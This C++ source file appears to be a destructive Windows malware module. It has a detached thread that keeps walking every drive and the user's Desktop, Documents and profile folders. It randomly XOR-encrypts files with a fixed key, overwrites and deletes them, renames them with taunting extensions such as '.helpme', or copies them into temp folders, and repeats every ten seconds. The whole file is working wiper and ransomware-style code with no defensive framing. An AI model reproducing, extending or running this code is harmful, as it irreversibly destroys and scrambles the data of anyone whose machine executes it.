#include <windows.h>
#include <filesystem>
#include <string>
#include <random>
#include <chrono>
#include <fstream>
#include <vector>
#include <thread>  // <--- ДОБАВЛЕНО
#include <shlobj.h>

namespace fs = std::filesystem;
std::mt19937 fileRng((unsigned)std::chrono::steady_clock::now().time_since_epoch().count());

void EncryptFile(const fs::path& filePath) {
    try {
        std::ifstream in(filePath, std::ios::binary);
        if (!in) return;

        std::vector<char> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        in.close();

        unsigned char key = 0xAA;
        for (auto& byte : data) {
            byte ^= key;
        }

        std::ofstream out(filePath, std::ios::binary);
        out.write(data.data(), data.size());
        out.close();

        std::string newName = filePath.string() + ".encrypted";
        fs::rename(filePath, newName);
    } catch (...) {}
}

void DeleteFileSecurely(const fs::path& filePath) {
    try {
        if (fs::exists(filePath) && fs::is_regular_file(filePath)) {
            std::ofstream out(filePath, std::ios::binary);
            if (out) {
                for (int i = 0; i < 3; i++) {
                    std::vector<char> junk((size_t)fs::file_size(filePath));
                    for (auto& c : junk) {
                        c = static_cast<char>(std::uniform_int_distribution<int>(0, 255)(fileRng));
                    }
                    out.seekp(0);
                    out.write(junk.data(), junk.size());
                }
                out.close();
            }
            fs::remove(filePath);
        }
    } catch (...) {}
}

void RenameFile(const fs::path& filePath) {
    try {
        if (fs::exists(filePath) && fs::is_regular_file(filePath)) {
            std::string extensions[] = {".angry", ".helpme", ".666", ".hack", ".giveup"};
            std::string ext = extensions[std::uniform_int_distribution<int>(0, 4)(fileRng)];
            std::string newName = filePath.string() + ext;
            fs::rename(filePath, newName);
        }
    } catch (...) {}
}

void CopyFilesToRandom(const fs::path& sourceDir) {
    try {
        std::vector<fs::path> files;
        for (const auto& entry : fs::recursive_directory_iterator(sourceDir)) {
            if (fs::is_regular_file(entry)) {
                files.push_back(entry.path());
            }
        }

        for (int i = 0; i < 50 && i < (int)files.size(); i++) {
            int idx = std::uniform_int_distribution<int>(0, (int)files.size() - 1)(fileRng);
            fs::path source = files[idx];

            fs::path temp = fs::temp_directory_path() / std::to_string(std::uniform_int_distribution<int>(1000, 9999)(fileRng));
            fs::create_directories(temp);

            fs::path dest = temp / source.filename();
            fs::copy(source, dest, fs::copy_options::overwrite_existing);
        }
    } catch (...) {}
}

void ProcessDirectory(const fs::path& dirPath) {
    try {
        if (!fs::exists(dirPath)) return;

        for (const auto& entry : fs::recursive_directory_iterator(dirPath)) {
            if (!fs::is_regular_file(entry)) continue;

            std::string ext = entry.path().extension().string();
            if (ext == ".exe" || ext == ".dll" || ext == ".sys") continue;

            int action = std::uniform_int_distribution<int>(0, 3)(fileRng);
            switch (action) {
                case 0: EncryptFile(entry.path()); break;
                case 1: DeleteFileSecurely(entry.path()); break;
                case 2: RenameFile(entry.path()); break;
                case 3: CopyFilesToRandom(entry.path().parent_path()); break;
            }
            Sleep(10);
        }
    } catch (...) {}
}

void InitializeFileSystemModule() {
    std::thread fileThread([]() {
        while (true) {
            for (char drive = 'C'; drive <= 'Z'; drive++) {
                std::string drivePath = std::string(1, drive) + ":\\";
                if (fs::exists(drivePath)) {
                    ProcessDirectory(drivePath);
                }
            }

            char desktopPath[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
            ProcessDirectory(desktopPath);

            char documentsPath[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, documentsPath);
            ProcessDirectory(documentsPath);

            char userPath[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userPath);
            ProcessDirectory(userPath);

            Sleep(10000);
        }
    });
    fileThread.detach();
}
